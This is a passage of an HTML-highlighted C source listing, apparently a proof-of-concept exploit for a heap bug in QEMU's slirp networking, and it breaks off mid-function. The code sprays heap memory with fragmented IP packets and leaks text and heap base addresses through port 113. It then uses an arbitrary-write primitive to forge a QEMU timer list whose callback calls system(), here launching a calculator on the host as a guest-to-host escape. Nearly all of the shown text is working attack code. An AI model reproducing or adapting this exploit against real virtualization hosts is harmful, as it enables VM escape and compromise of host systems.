class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; // close()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; // strcpy, memset(), and memcpy()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;      // struct addrinfo</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;  // needed for socket(), uint8_t, uint16_t, uint32_t</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt; // needed for socket()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt; // IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt; // struct ip and IP_MAXPACKET (which is 65535)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip_icmp.h&gt; // struct icmp, ICMP_ECHO</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FAVOR_BSD          <span class="comment">// Use BSD format of tcp header</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;     // struct tcphdr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;       // inet_pton() and inet_ntop()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;       // macro ioctl is defined</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/ioctls.h&gt;     // defines values for argument "request" of ioctl.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;          // struct ifreq</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;  // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt; // struct sockaddr_ll (see man 7 packet)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt; // gettimeofday()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt; // errno, perror()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some constants.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HDRLEN 14 <span class="comment">// Ethernet header length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP4_HDRLEN 20 <span class="comment">// IPv4 header length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TCP_HDRLEN 20 <span class="comment">// TCP header length, excludes options data</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ICMP_HDRLEN 8 <span class="comment">// ICMP header length for echo request, excludes data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                                       \</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s:%d(): "</span> fmt, __func__, __LINE__, ##__VA_ARGS__);   \</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                                       \</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char  g_interface[] = "ens2";</span></span><br><span class="line"><span class="keyword">char</span>  g_interface[] = <span class="string">"enp0s3"</span>;</span><br><span class="line"><span class="keyword">char</span> host[] = <span class="string">"10.0.2.2"</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span> *Slirp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_next</span>;</span> <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span> <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span> <span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">    <span class="keyword">int</span> m_flags;            <span class="comment">/* Misc flags */</span></span><br><span class="line">    <span class="keyword">int</span> m_size;             <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line">    <span class="keyword">caddr_t</span> m_data; <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="keyword">int</span> m_len;      <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="keyword">bool</span> resolution_requested;</span><br><span class="line">    <span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="keyword">char</span> *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="keyword">char</span> m_dat[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some header info to pass to the send_ip_pkt</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_id;</span><br><span class="line">    <span class="keyword">uint16_t</span> ip_off;</span><br><span class="line">    <span class="keyword">bool</span> MF;</span><br><span class="line">    <span class="keyword">uint8_t</span> ip_p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function prototypes</span></span><br><span class="line"><span class="keyword">uint16_t</span> checksum(<span class="keyword">uint16_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> icmp4_checksum(struct icmp, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> tcp4_checksum(struct ip, struct tcphdr, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">allocate_strmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">uint8_t</span> *allocate_ustrmem(<span class="keyword">int</span>);</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">allocate_intmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">uint16_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_ip_pkt</span><span class="params">(struct ip_pkt_info *, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send_raw_pkt</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span>, <span class="keyword">int</span>, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> text_base, heap_base;</span><br><span class="line"><span class="keyword">uint16_t</span> g_spray_ip_id;</span><br><span class="line"><span class="keyword">int</span> stop_flag;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> eth_frame[] =</span><br><span class="line">        <span class="string">"\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00"</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="keyword">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"game start"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);</span><br><span class="line">    iphdr = (struct ip *)(buf + ETH_HDRLEN);</span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"10.0.2.15"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"10.0.2.2"</span>);</span><br><span class="line">    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    iphdr-&gt;ip_v = <span class="number">4</span>;</span><br><span class="line">    iphdr-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这不需要htons，因为在ip_input里会转换一遍</span></span><br><span class="line">    iphdr-&gt;ip_len = (ICMP_HDRLEN);</span><br><span class="line">    iphdr-&gt;ip_id = (<span class="number">0xcdcd</span>);</span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    iphdr-&gt;ip_off = ((<span class="number">0</span> &lt;&lt; <span class="number">15</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">14</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">13</span>) + (<span class="number">0</span> &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    iphdr-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line">    iphdr-&gt;ip_p = IPPROTO_ICMP;</span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src))) != <span class="number">1</span> ||</span><br><span class="line">        (status = inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    iphdr-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr-&gt;ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    icmphdr = (struct icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    icmphdr-&gt;icmp_type = ICMP_ECHO;</span><br><span class="line">    <span class="comment">// Message Code (8 bits): echo request</span></span><br><span class="line">    icmphdr-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Identifier (16 bits): usually pid of sending process - pick a number</span></span><br><span class="line">    icmphdr-&gt;icmp_id = htons(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// Sequence Number (16 bits): starts at 0</span></span><br><span class="line">    icmphdr-&gt;icmp_seq = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ICMP header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    <span class="comment">// TBD</span></span><br><span class="line">    <span class="comment">// icmphdr-&gt;icmp_cksum = icmp4_checksum(icmphdr, data, datalen);</span></span><br><span class="line">    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//const char exec_cmd[] =</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">//const char exec_cmd[] = "/snap/bin/gnome-calculator";</span></span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> exec_cmd[] = <span class="string">"/usr/bin/xcalc"</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf + ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN, exec_cmd,<span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xaabb</span>;</span><br><span class="line">    arbitrary_write(</span><br><span class="line">        <span class="number">0x0b00</span>, <span class="number">3</span>, buf,</span><br><span class="line">        ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN + <span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>, <span class="number">0x250</span>+<span class="number">0x50</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xbbaa</span>;</span><br><span class="line">    leak(<span class="number">0x0b00</span> + <span class="number">0x318</span> + <span class="number">0x14</span> + ETH_HDRLEN,</span><br><span class="line">         <span class="number">3</span>); <span class="comment">// reass处理完后会把m_data减掉ip头的长度</span></span><br><span class="line">    dbg_printf(<span class="string">"after leak"</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake timer_list</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> fake_timer_list = heap_base + <span class="number">0x1000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)buf = text_base +  0x11e9040; // qemu_clocks</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = text_base +  <span class="number">0x12C3920</span>; <span class="comment">// qemu_clocks</span></span><br><span class="line">    <span class="built_in">memset</span>(buf + <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span> * <span class="number">6</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x38</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x40</span>) = fake_timer_list + <span class="number">0x70</span>; <span class="comment">// active_timers</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x58</span>) = text_base + <span class="number">0x30eeda</span>; <span class="comment">// qemu_timer_notify_cb</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x60</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x68</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">// end of timer_list</span></span><br><span class="line">    <span class="comment">// start of active_timers</span></span><br><span class="line">    <span class="comment">/* gdb-peda$ p *timer_list-&gt;active_timers</span></span><br><span class="line"><span class="comment">    $49 = &#123;</span></span><br><span class="line"><span class="comment">        expire_time = 0x22823f5aad00,</span></span><br><span class="line"><span class="comment">        timer_list = 0x55a8d2594840,</span></span><br><span class="line"><span class="comment">        cb = 0x55a8d0b66a82 &lt;gui_update&gt;,</span></span><br><span class="line"><span class="comment">        opaque = 0x55a8d3ae6e50,</span></span><br><span class="line"><span class="comment">        next = 0x55a8d3ae6e80,</span></span><br><span class="line"><span class="comment">        attributes = 0x0,</span></span><br><span class="line"><span class="comment">        scale = 0xf4240</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x70</span>) = <span class="number">0</span>; <span class="comment">// expire_time set to 0 will trigger func cb</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x78</span>) = fake_timer_list;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x80</span>) = text_base + <span class="number">0x2be010</span>;    <span class="comment">// system plt</span></span><br><span class="line">    <span class="comment">//to verify</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x88</span>) = heap_base + <span class="number">0xe38</span> + <span class="number">0xa</span>; <span class="comment">// parameter address</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x90</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x98</span>) = <span class="number">0x000f424000000000</span>;</span><br><span class="line">    g_spray_ip_id = <span class="number">0xccbb</span>;</span><br><span class="line">    arbitrary_write(fake_timer_list - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">0xa0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have finished writing fake timer list.\n"</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    stop_flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// dbg_printf("check heap here");</span></span><br><span class="line">    <span class="comment">// qemu timer</span></span><br><span class="line">    <span class="comment">// 改掉全局的main_loop_tlg</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = fake_timer_list; <span class="comment">// qemu_clocks</span></span><br><span class="line">    g_spray_ip_id = <span class="number">0xddbb</span>;</span><br><span class="line">    arbitrary_write(text_base + <span class="number">0x12C3900</span> - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">8</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]Now we have finished writing main_loop_tlg.\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i, recvsd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">"ama2in9"</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    dbg_printf(<span class="string">"in leak_text...\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"0ops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span 